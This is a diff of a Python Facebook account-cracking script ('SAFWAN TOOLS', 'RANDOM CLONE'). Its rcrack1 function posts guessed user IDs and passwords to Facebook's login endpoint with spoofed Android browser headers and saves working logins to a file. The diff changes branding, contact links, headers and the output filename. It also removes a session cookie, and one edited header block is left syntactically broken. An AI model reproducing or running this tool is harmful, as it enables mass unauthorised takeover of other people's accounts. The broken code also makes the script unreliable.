@@ -218,13 +218,15 @@ logo= """
 
  \033[1;92m
 
-████████  █████  ███████ ██     ██  █████  ███    ██ 
-██      ██   ██ ██      ██     ██ ██   ██ ████   ██ 
-███████ ███████ █████   ██  █  ██ ███████ ██ ██  ██ 
-     ██ ██   ██ ██      ██ ███ ██ ██   ██ ██  ██ ██ 
-███████ ██   ██ ██       ███ ███  ██   ██ ██   ████ 
-                                                    
-                                                    
+ #####     #    ####### #     #    #    #     # 
+#     #   # #   #       #  #  #   # #   ##    # 
+#        #   #  #       #  #  #  #   #  # #   # 
+ #####  #     # #####   #  #  # #     # #  #  # 
+      # ####### #       #  #  # ####### #   # # 
+#     # #     # #       #  #  # #     # #    ## 
+ #####  #     # #        ## ##  #     # #     # 
+
+
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO SAFWAN TOOLS               \033[;0m\033[1;91m\033[1;92m
 
 
@@ -235,9 +237,10 @@ logo= """
 
 \033[1;32m[-] VERSION   :\033[1;32m 3.0
 
-\033[1;32m[-] AUTHOR    :\033[1;32m SAFWAN ISLAM
-\033[1;32m[-] GITHUB    :\033[1;32m SAFWAN GAIMING
-\033[1;32m[-] FACEBOOK  :\033[1;32m SAFWAN ISLAM
+\033[1;32m[-] AUTHOR    :\033[1;32m SAFWAN ISLAM 
+
+\033[1;32m[-] GITHUB    :\033[1;32m SAFWAN ISLAM
+\033[1;32m[-] FACEBOOK  :\033[1;32m SAFWAN ISLAM 
 \033[1;92m══════════════════════════════════════════
 
 \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SAFWAN BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
@@ -292,7 +295,8 @@ else:
 
     print("\n\t\tContact Admin ")
 
-    os.system('xdg-open https://wa.me/qr/7VB37KNYDG74K1
+    os.system('xdg-open https://wa.me/+8801324313100')
+
     exit()
 
 class Main:
@@ -311,7 +315,8 @@ class Main:
 
         print(logo)
 
-        os.system('xdg-open fb://https://facebook.com/groups/627578409453077/
+        os.system('xdg-open fb://group/1885398221816745?ref=share&mibextid=NSMWBT')
+
         print('\033[1;32m[\033[1;32m1\033[1;32m] START RANDOM CLONE')
 
         print('\033[1;32m[\033[1;32m0\033[1;32m] EXIT')
@@ -460,23 +465,31 @@ def rcrack1(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb =  {
-    'authority': 'mobile.facebook.com',
+            header_freefb = {
+    'authority': 'x.facebook.com',
     'accept': '*/*',
     'accept-language': 'en-US,en;q=0.9',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': 'dbln=%7B%22100024761928069%22%3A%22wCha2d51%22%2C%2261552224394549%22%3A%22x0zxNFWK%22%2C%2261552496824931%22%3A%22ua9CXfRQ%22%7D; datr=PKIzZTnrRmBdIAIh-EMRhRhH; sb=PKIzZR6kH3FGKA8yXqZYo3-K; vpd=v1%3B720x393x2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2353%3Btimestamp%3A1699552886; m_pixel_ratio=2.75; wd=393x720; fr=0HicTH1hl0shcPTWC.AWU2NFyN6GENnkW2A2ioH_FGysY.BlM6I8.ce.AAA.0.0.BlUy3m.AWW6Y_B8Oo0',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
+    'dpr': '2.75',
+    'origin': 'https://x.facebook.com',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"M2010J19SG"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36', pro,}
-
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '393',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVoOp9P0QZ4',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream'
+            lo = session.post('https://x.facebook.com/login/device-based/login/async/=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
@@ -488,7 +501,7 @@ def rcrack1(uid,pwx,tl):
 
                 print(f"\033[38;5;46m[SAFU-OK💚] {uid}|{ps}")
 
-                open('/sdcard/SAFU-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAMIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(uid)
 
